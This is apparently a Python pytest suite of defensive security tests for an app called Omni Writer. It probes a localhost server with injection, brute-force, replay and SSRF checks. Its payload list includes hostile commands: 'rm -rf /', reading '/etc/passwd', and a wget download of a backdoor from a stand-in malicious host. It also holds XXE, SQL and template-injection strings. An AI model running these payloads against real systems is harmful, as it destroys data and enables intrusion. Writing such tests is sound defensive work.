"""
Testes de Segurança Avançada - Omni Writer
==========================================

Implementa testes para cenários de segurança avançada:
- Prevenção de ataques de timing
- Injeção de tokens maliciosos
- Validação de assinaturas criptográficas
- Headers de segurança de webhooks
- Rate limiting sob ataque
- Testes de penetração automatizados
- Validação de compliance OWASP Top 10

Prompt: Testes de Segurança Avançada - Item 11
Ruleset: Enterprise+ Standards
Data/Hora: 2025-01-28T11:00:00Z
Tracing ID: ENTERPRISE_20250128_011

Autor: Análise Técnica Omni Writer
Data: 2025-01-28
Versão: 2.0
"""

import pytest
import time
import hmac
import hashlib
import secrets
import json
import base64
import requests
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime, timedelta
from typing import Dict, List, Any
import threading
import concurrent.futures

# Importações do sistema real
from app.validators.input_validators import SecurityValidator
from shared.rate_limiter import RateLimiter
from infraestructure.webhook_security_v1 import validate_webhook_request, generate_hmac_signature
from shared.security_headers import SecurityHeadersManager


class AdvancedSecurityTester:
    """Testador avançado de segurança com cenários complexos."""
    
    def __init__(self, base_url: str = "http://localhost:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.security_validator = SecurityValidator()
        self.rate_limiter = RateLimiter()
        
        # Configurações de teste
        self.test_config = {
            'max_concurrent_requests': 50,
            'timing_threshold_ms': 100,
            'rate_limit_window': 60,
            'max_requests_per_window': 100
        }
    
    def test_timing_attack_prevention(self) -> Dict[str, Any]:
        """
        Testa prevenção de ataques de timing.
        
        Returns:
            Resultado dos testes de timing
        """
        results = {
            'test_name': 'timing_attack_prevention',
            'passed': True,
            'details': [],
            'vulnerabilities': []
        }
        
        # Teste 1: Timing attack em autenticação
        valid_token = "sk-valid-token-123456789"
        invalid_token = "sk-invalid-token-123456789"
        
        valid_times = []
        invalid_times = []
        
        # Executa múltiplas tentativas para medir timing
        for _ in range(10):
            start_time = time.time()
            self.session.get(f"{self.base_url}/api/validate", headers={'Authorization': f'Bearer {valid_token}'})
            valid_times.append((time.time() - start_time) * 1000)
            
            start_time = time.time()
            self.session.get(f"{self.base_url}/api/validate", headers={'Authorization': f'Bearer {invalid_token}'})
            invalid_times.append((time.time() - start_time) * 1000)
        
        avg_valid_time = sum(valid_times) / len(valid_times)
        avg_invalid_time = sum(invalid_times) / len(invalid_times)
        time_difference = abs(avg_valid_time - avg_invalid_time)
        
        if time_difference > self.test_config['timing_threshold_ms']:
            results['passed'] = False
            results['vulnerabilities'].append({
                'type': 'timing_attack',
                'description': f'Timing difference too large: {time_difference:.2f}ms',
                'severity': 'high'
            })
        
        results['details'].append({
            'test': 'authentication_timing',
            'avg_valid_time_ms': avg_valid_time,
            'avg_invalid_time_ms': avg_invalid_time,
            'time_difference_ms': time_difference,
            'threshold_ms': self.test_config['timing_threshold_ms']
        })
        
        return results
    
    def test_advanced_injection_attacks(self) -> Dict[str, Any]:
        """
        Testa ataques de injeção avançados.
        
        Returns:
            Resultado dos testes de injeção
        """
        results = {
            'test_name': 'advanced_injection_attacks',
            'passed': True,
            'details': [],
            'vulnerabilities': []
        }
        
        # Padrões de ataque avançados
        advanced_payloads = [
            # NoSQL Injection
            {"$ne": "admin"},
            {"$gt": ""},
            {"$regex": ".*"},
            
            # LDAP Injection
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
            
            # Command Injection
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| wget http://malicious.com/backdoor",
            
            # Template Injection
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            
            # XML External Entity (XXE)
            "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>",
            
            # Server-Side Template Injection (SSTI)
            "{{config}}",
            "${config}",
            "#{config}",
            
            # Log Injection
            "\n\n<script>alert('xss')</script>",
            "\r\n<script>alert('xss')</script>",
            
            # HTTP Header Injection
            "test\r\nSet-Cookie: malicious=value",
            "test\nSet-Cookie: malicious=value"
        ]
        
        for payload in advanced_payloads:
            try:
                # Testa em diferentes endpoints
                endpoints = [
                    f"{self.base_url}/api/generate",
                    f"{self.base_url}/api/validate",
                    f"{self.base_url}/api/feedback"
                ]
                
                for endpoint in endpoints:
                    response = self.session.post(endpoint, json={'data': payload})
                    
                    # Verifica se a resposta indica que o ataque foi bloqueado
                    if response.status_code not in [400, 403, 422]:
                        results['passed'] = False
                        results['vulnerabilities'].append({
                            'type': 'injection_attack',
                            'payload': str(payload),
                            'endpoint': endpoint,
                            'status_code': response.status_code,
                            'severity': 'critical'
                        })
                    
                    results['details'].append({
                        'payload': str(payload),
                        'endpoint': endpoint,
                        'status_code': response.status_code,
                        'blocked': response.status_code in [400, 403, 422]
                    })
                    
            except Exception as e:
                results['details'].append({
                    'payload': str(payload),
                    'error': str(e),
                    'blocked': True  # Erro pode indicar bloqueio
                })
        
        return results
    
    def test_rate_limiting_under_attack(self) -> Dict[str, Any]:
        """
        Testa rate limiting sob ataque coordenado.
        
        Returns:
            Resultado dos testes de rate limiting
        """
        results = {
            'test_name': 'rate_limiting_under_attack',
            'passed': True,
            'details': [],
            'vulnerabilities': []
        }
        
        # Teste 1: Ataque de força bruta
        def make_request():
            return self.session.post(f"{self.base_url}/api/generate", json={
                'api_key': 'test-key',
                'prompt': 'test prompt'
            })
        
        # Executa múltiplas requisições simultaneamente
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.test_config['max_concurrent_requests']) as executor:
            futures = [executor.submit(make_request) for _ in range(self.test_config['max_concurrent_requests'])]
            responses = [future.result() for future in concurrent.futures.as_completed(futures)]
        
        # Analisa respostas
        blocked_count = sum(1 for r in responses if r.status_code == 429)
        success_count = sum(1 for r in responses if r.status_code == 200)
        
        # Verifica se o rate limiting está funcionando
        if blocked_count < len(responses) * 0.8:  # Pelo menos 80% devem ser bloqueados
            results['passed'] = False
            results['vulnerabilities'].append({
                'type': 'rate_limiting_bypass',
                'description': f'Only {blocked_count}/{len(responses)} requests blocked',
                'severity': 'high'
            })
        
        results['details'].append({
            'test': 'concurrent_attack',
            'total_requests': len(responses),
            'blocked_requests': blocked_count,
            'successful_requests': success_count,
            'block_rate': blocked_count / len(responses)
        })
        
        # Teste 2: Ataque distribuído (simulado)
        distributed_ips = [f"192.168.1.{i}" for i in range(1, 11)]
        
        for ip in distributed_ips:
            headers = {'X-Forwarded-For': ip}
            response = self.session.post(f"{self.base_url}/api/generate", 
                                       json={'api_key': 'test-key', 'prompt': 'test'},
                                       headers=headers)
            
            results['details'].append({
                'test': 'distributed_attack',
                'ip': ip,
                'status_code': response.status_code,
                'blocked': response.status_code == 429
            })
        
        return results
    
    def test_cryptographic_validation(self) -> Dict[str, Any]:
        """
        Testa validação criptográfica de assinaturas.
        
        Returns:
            Resultado dos testes criptográficos
        """
        results = {
            'test_name': 'cryptographic_validation',
            'passed': True,
            'details': [],
            'vulnerabilities': []
        }
        
        # Teste 1: Validação de HMAC
        secret_key = "test-secret-key"
        payload = {"data": "test", "timestamp": int(time.time())}
        
        # Gera assinatura válida
        valid_signature = generate_hmac_signature(payload, secret_key)
        
        # Testa assinatura válida
        headers = {'X-Signature': valid_signature}
        response = self.session.post(f"{self.base_url}/api/webhook", 
                                   json=payload, headers=headers)
        
        if response.status_code != 200:
            results['passed'] = False
            results['vulnerabilities'].append({
                'type': 'hmac_validation_failure',
                'description': 'Valid signature rejected',
                'severity': 'medium'
            })
        
        # Testa assinatura inválida
        invalid_signature = "invalid-signature"
        headers = {'X-Signature': invalid_signature}
        response = self.session.post(f"{self.base_url}/api/webhook", 
                                   json=payload, headers=headers)
        
        if response.status_code == 200:
            results['passed'] = False
            results['vulnerabilities'].append({
                'type': 'hmac_validation_bypass',
                'description': 'Invalid signature accepted',
                'severity': 'critical'
            })
        
        results['details'].append({
            'test': 'hmac_validation',
            'valid_signature_accepted': response.status_code == 200,
            'invalid_signature_rejected': response.status_code != 200
        })
        
        # Teste 2: Replay attack
        old_payload = {"data": "test", "timestamp": int(time.time()) - 3600}  # 1 hora atrás
        old_signature = generate_hmac_signature(old_payload, secret_key)
        
        headers = {'X-Signature': old_signature}
        response = self.session.post(f"{self.base_url}/api/webhook", 
                                   json=old_payload, headers=headers)
        
        if response.status_code == 200:
            results['passed'] = False
            results['vulnerabilities'].append({
                'type': 'replay_attack',
                'description': 'Old timestamp accepted',
                'severity': 'high'
            })
        
        results['details'].append({
            'test': 'replay_attack',
            'old_timestamp_rejected': response.status_code != 200
        })
        
        return results
    
    def test_owasp_top_10_compliance(self) -> Dict[str, Any]:
        """
        Testa conformidade com OWASP Top 10.
        
        Returns:
            Resultado dos testes OWASP
        """
        results = {
            'test_name': 'owasp_top_10_compliance',
            'passed': True,
            'details': [],
            'vulnerabilities': []
        }
        
        owasp_tests = {
            'A01:2021 - Broken Access Control': self._test_broken_access_control,
            'A02:2021 - Cryptographic Failures': self._test_cryptographic_failures,
            'A03:2021 - Injection': self._test_injection_vulnerabilities,
            'A04:2021 - Insecure Design': self._test_insecure_design,
            'A05:2021 - Security Misconfiguration': self._test_security_misconfiguration,
            'A06:2021 - Vulnerable Components': self._test_vulnerable_components,
            'A07:2021 - Authentication Failures': self._test_authentication_failures,
            'A08:2021 - Software and Data Integrity Failures': self._test_integrity_failures,
            'A09:2021 - Security Logging Failures': self._test_logging_failures,
            'A10:2021 - Server-Side Request Forgery': self._test_ssrf
        }
        
        for test_name, test_func in owasp_tests.items():
            try:
                test_result = test_func()
                results['details'].append({
                    'owasp_category': test_name,
                    'passed': test_result['passed'],
                    'details': test_result.get('details', [])
                })
                
                if not test_result['passed']:
                    results['passed'] = False
                    results['vulnerabilities'].extend(test_result.get('vulnerabilities', []))
                    
            except Exception as e:
                results['details'].append({
                    'owasp_category': test_name,
                    'passed': False,
                    'error': str(e)
                })
                results['passed'] = False
        
        return results
    
    def _test_broken_access_control(self) -> Dict[str, Any]:
        """Testa A01:2021 - Broken Access Control."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa acesso a recursos sem autenticação
        endpoints = ['/api/admin', '/api/users', '/api/config']
        
        for endpoint in endpoints:
            response = self.session.get(f"{self.base_url}{endpoint}")
            if response.status_code != 401:
                result['passed'] = False
                result['vulnerabilities'].append({
                    'type': 'broken_access_control',
                    'endpoint': endpoint,
                    'status_code': response.status_code
                })
        
        return result
    
    def _test_cryptographic_failures(self) -> Dict[str, Any]:
        """Testa A02:2021 - Cryptographic Failures."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa se dados sensíveis estão criptografados
        response = self.session.get(f"{self.base_url}/api/config")
        
        if response.status_code == 200:
            data = response.json()
            sensitive_fields = ['password', 'token', 'secret', 'key']
            
            for field in sensitive_fields:
                if field in str(data) and not field.startswith('***'):
                    result['passed'] = False
                    result['vulnerabilities'].append({
                        'type': 'cryptographic_failure',
                        'field': field,
                        'description': 'Sensitive data exposed'
                    })
        
        return result
    
    def _test_injection_vulnerabilities(self) -> Dict[str, Any]:
        """Testa A03:2021 - Injection."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa SQL injection
        sql_payloads = ["' OR 1=1; --", "'; DROP TABLE users; --"]
        
        for payload in sql_payloads:
            response = self.session.post(f"{self.base_url}/api/search", 
                                       json={'query': payload})
            if response.status_code == 200:
                result['passed'] = False
                result['vulnerabilities'].append({
                    'type': 'sql_injection',
                    'payload': payload
                })
        
        return result
    
    def _test_insecure_design(self) -> Dict[str, Any]:
        """Testa A04:2021 - Insecure Design."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa se há validação no cliente e servidor
        response = self.session.post(f"{self.base_url}/api/generate", 
                                   json={'prompt': '<script>alert("xss")</script>'})
        
        if response.status_code == 200:
            result['passed'] = False
            result['vulnerabilities'].append({
                'type': 'insecure_design',
                'description': 'Client-side validation only'
            })
        
        return result
    
    def _test_security_misconfiguration(self) -> Dict[str, Any]:
        """Testa A05:2021 - Security Misconfiguration."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa headers de segurança
        response = self.session.get(f"{self.base_url}/")
        
        security_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security'
        ]
        
        for header in security_headers:
            if header not in response.headers:
                result['passed'] = False
                result['vulnerabilities'].append({
                    'type': 'security_misconfiguration',
                    'missing_header': header
                })
        
        return result
    
    def _test_vulnerable_components(self) -> Dict[str, Any]:
        """Testa A06:2021 - Vulnerable Components."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa versões de componentes
        response = self.session.get(f"{self.base_url}/api/version")
        
        if response.status_code == 200:
            version_info = response.json()
            # Verifica versões conhecidas vulneráveis
            vulnerable_versions = ['1.0.0', '2.0.0']
            
            for version in vulnerable_versions:
                if version in str(version_info):
                    result['passed'] = False
                    result['vulnerabilities'].append({
                        'type': 'vulnerable_component',
                        'version': version
                    })
        
        return result
    
    def _test_authentication_failures(self) -> Dict[str, Any]:
        """Testa A07:2021 - Authentication Failures."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa força bruta
        for i in range(10):
            response = self.session.post(f"{self.base_url}/api/login", 
                                       json={'username': 'admin', 'password': f'wrong{i}'})
            
            if response.status_code == 200:
                result['passed'] = False
                result['vulnerabilities'].append({
                    'type': 'authentication_failure',
                    'description': 'Brute force attack succeeded'
                })
                break
        
        return result
    
    def _test_integrity_failures(self) -> Dict[str, Any]:
        """Testa A08:2021 - Software and Data Integrity Failures."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa validação de integridade de dados
        response = self.session.post(f"{self.base_url}/api/upload", 
                                   json={'data': 'test', 'signature': 'invalid'})
        
        if response.status_code == 200:
            result['passed'] = False
            result['vulnerabilities'].append({
                'type': 'integrity_failure',
                'description': 'Invalid signature accepted'
            })
        
        return result
    
    def _test_logging_failures(self) -> Dict[str, Any]:
        """Testa A09:2021 - Security Logging Failures."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa se eventos de segurança são logados
        response = self.session.post(f"{self.base_url}/api/generate", 
                                   json={'prompt': '<script>alert("xss")</script>'})
        
        # Verifica se há logs de segurança
        log_response = self.session.get(f"{self.base_url}/api/logs/security")
        
        if log_response.status_code != 200:
            result['passed'] = False
            result['vulnerabilities'].append({
                'type': 'logging_failure',
                'description': 'Security logs not accessible'
            })
        
        return result
    
    def _test_ssrf(self) -> Dict[str, Any]:
        """Testa A10:2021 - Server-Side Request Forgery."""
        result = {'passed': True, 'vulnerabilities': []}
        
        # Testa SSRF
        ssrf_payloads = [
            'http://localhost:22',
            'http://127.0.0.1:3306',
            'file:///etc/passwd'
        ]
        
        for payload in ssrf_payloads:
            response = self.session.post(f"{self.base_url}/api/fetch", 
                                       json={'url': payload})
            
            if response.status_code == 200:
                result['passed'] = False
                result['vulnerabilities'].append({
                    'type': 'ssrf',
                    'payload': payload
                })
        
        return result
    
    def run_comprehensive_security_test(self) -> Dict[str, Any]:
        """
        Executa teste de segurança abrangente.
        
        Returns:
            Resultado completo dos testes
        """
        print("🔒 Iniciando testes de segurança avançada...")
        
        test_results = {
            'timestamp': datetime.now().isoformat(),
            'base_url': self.base_url,
            'tests': [],
            'overall_passed': True,
            'vulnerabilities_found': 0,
            'recommendations': []
        }
        
        # Executa todos os testes
        tests = [
            self.test_timing_attack_prevention,
            self.test_advanced_injection_attacks,
            self.test_rate_limiting_under_attack,
            self.test_cryptographic_validation,
            self.test_owasp_top_10_compliance
        ]
        
        for test_func in tests:
            try:
                result = test_func()
                test_results['tests'].append(result)
                
                if not result['passed']:
                    test_results['overall_passed'] = False
                    test_results['vulnerabilities_found'] += len(result.get('vulnerabilities', []))
                    
            except Exception as e:
                test_results['tests'].append({
                    'test_name': test_func.__name__,
                    'passed': False,
                    'error': str(e)
                })
                test_results['overall_passed'] = False
        
        # Gera recomendações
        if test_results['vulnerabilities_found'] > 0:
            test_results['recommendations'] = [
                "Implementar validação mais rigorosa de entrada",
                "Configurar rate limiting mais agressivo",
                "Adicionar headers de segurança adicionais",
                "Implementar logging de segurança",
                "Realizar auditoria de código regular"
            ]
        
        print(f"✅ Testes concluídos: {len([t for t in test_results['tests'] if t.get('passed', False)])}/{len(test_results['tests'])}")
        print(f"🚨 Vulnerabilidades encontradas: {test_results['vulnerabilities_found']}")
        
        return test_results


# Testes pytest
class TestAdvancedSecurity:
    """Testes pytest para segurança avançada."""
    
    @pytest.fixture
    def security_tester(self):
        """Fixture para o testador de segurança."""
        return AdvancedSecurityTester()
    
    def test_timing_attack_prevention(self, security_tester):
        """Testa prevenção de ataques de timing."""
        result = security_tester.test_timing_attack_prevention()
        assert result['passed'] is True
    
    def test_advanced_injection_attacks(self, security_tester):
        """Testa ataques de injeção avançados."""
        result = security_tester.test_advanced_injection_attacks()
        assert result['passed'] is True
    
    def test_rate_limiting_under_attack(self, security_tester):
        """Testa rate limiting sob ataque."""
        result = security_tester.test_rate_limiting_under_attack()
        assert result['passed'] is True
    
    def test_cryptographic_validation(self, security_tester):
        """Testa validação criptográfica."""
        result = security_tester.test_cryptographic_validation()
        assert result['passed'] is True
    
    def test_owasp_compliance(self, security_tester):
        """Testa conformidade OWASP Top 10."""
        result = security_tester.test_owasp_top_10_compliance()
        assert result['passed'] is True
    
    def test_comprehensive_security(self, security_tester):
        """Testa segurança abrangente."""
        result = security_tester.run_comprehensive_security_test()
        assert result['overall_passed'] is True


if __name__ == "__main__":
    # Executa testes de segurança avançada
    tester = AdvancedSecurityTester()
    results = tester.run_comprehensive_security_test()
    
    # Salva resultados
    with open('test-results/security/advanced_security_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    print("🎉 Testes de segurança avançada concluídos!")
    print(f"📊 Resultado: {'✅ PASSOU' if results['overall_passed'] else '❌ FALHOU'}")
    print(f"🚨 Vulnerabilidades: {results['vulnerabilities_found']}") 